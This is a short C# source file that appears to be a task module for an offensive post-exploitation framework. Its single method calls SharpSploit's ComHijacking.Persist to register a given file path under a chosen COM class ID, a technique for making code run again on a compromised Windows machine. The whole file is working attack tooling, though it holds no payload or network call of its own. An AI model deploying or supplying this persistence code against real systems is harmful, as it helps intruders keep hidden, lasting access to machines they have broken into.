using System;
  
using SharpSploit.Persistence;

public static class Task
{
    public static string Execute(string CLSID, string Path)
    {
        string results = ComHijacking.Persist(CLSID, Path);
        return results.ToString();
    }
}